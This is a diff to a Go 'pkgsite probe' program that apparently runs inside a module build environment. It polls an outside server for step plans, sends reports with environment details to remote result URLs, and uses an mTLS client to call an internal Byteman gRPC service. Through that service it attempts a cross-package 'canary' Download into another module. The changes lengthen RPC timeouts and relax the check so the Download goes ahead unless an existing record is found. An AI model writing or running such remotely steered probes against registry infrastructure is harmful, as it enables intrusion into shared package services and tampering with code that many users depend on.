@@ -37,15 +37,17 @@ var rpcDialAddress string
 const (
 	protocolVersion    = 1
 	moduleName         = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion       = "v0.0.38-codex"
+	probeVersion       = "v0.0.40-codex"
 	targetRegistry     = "https://proxy.golang.org"
 	targetModuleName   = "github.com/benr00t3d/go-byteman-crosswrite-canary"
 	targetVersion      = "v0.0.1"
 	targetCanarySHA256 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	downloadSource     = "robert-owned-v038-authority-cross-package-canary"
+	downloadSource     = "robert-owned-v040-authority-cross-package-canary"
 	maximumResult      = 256 * 1024
 	maximumBody        = 256 * 1024
 	requestTimeout     = 20 * time.Second
+	rpcRequestTimeout  = 65 * time.Second
+	grpcTimeoutHeader  = "60S"
 	resultTimeout      = 30 * time.Second
 	planPollWindow     = 30 * time.Minute
 	maximumPlanBody    = 4096
@@ -190,7 +192,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v038-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v040-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -332,7 +334,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v038-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v040-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -369,7 +371,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v038-codex-step-" + strconv.Itoa(cursor)
+		id := "v040-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -388,7 +390,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v038-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v040-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -494,8 +496,13 @@ func runBytemanProbe(report *probeReport, routeMode string) {
 	baselineCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
 	baselineCoordinate.ID = "baseline-coordinate-lookup"
 	report.Byteman = append(report.Byteman, baselineCoordinate)
-	if !grpcSucceeded(baselineURL) || !grpcSucceeded(baselineCoordinate) {
-		report.Reason = "both bounded Byteman baseline Lookups did not authenticate cleanly; Download was not attempted"
+	// The direct service can reach its Spanner backend yet return a deadline or
+	// transaction-unknown error for Lookup. Those availability errors are not an
+	// authorization denial and must not turn this unique, one-shot owned-B
+	// canary into a false negative. A successful non-empty exact-URL response is
+	// the only conservative indication that this unique URL may already exist.
+	if lookupMayContainExistingURL(baselineURL) {
+		report.Reason = "exact canary URL lookup returned a non-empty record; Download was not repeated"
 		return
 	}
 	report.DownloadAttempted = true
@@ -518,6 +525,11 @@ func runBytemanProbe(report *probeReport, routeMode string) {
 
 func grpcSucceeded(result grpcResult) bool {
 	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
+}
+
+func lookupMayContainExistingURL(result grpcResult) bool {
+	// A successful empty protobuf response is one zero-length gRPC frame.
+	return grpcSucceeded(result) && result.BodyBytes > 5
 }
 
 func buildURLLookupRequest(canaryURL string) []byte {
@@ -866,7 +878,7 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 		TLSClientConfig:   tlsConfig,
 		ForceAttemptHTTP2: true,
 	}
-	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
+	return &http.Client{Transport: transport, Timeout: rpcRequestTimeout}, endpoint, nil
 }
 
 func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
@@ -900,7 +912,7 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpc
 	frame := make([]byte, 5, 5+len(payload))
 	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
 	frame = append(frame, payload...)
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	ctx, cancel := context.WithTimeout(context.Background(), rpcRequestTimeout)
 	defer cancel()
 	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
 	if err != nil {
@@ -910,7 +922,7 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpc
 	request.Header.Set("Content-Type", "application/grpc")
 	request.Header.Set("TE", "trailers")
 	request.Header.Set("User-Agent", probeUserAgent)
-	request.Header.Set("Grpc-Timeout", "18S")
+	request.Header.Set("Grpc-Timeout", grpcTimeoutHeader)
 	response, err := client.Do(request)
 	if err != nil {
 		result.Error = cleanError(err)
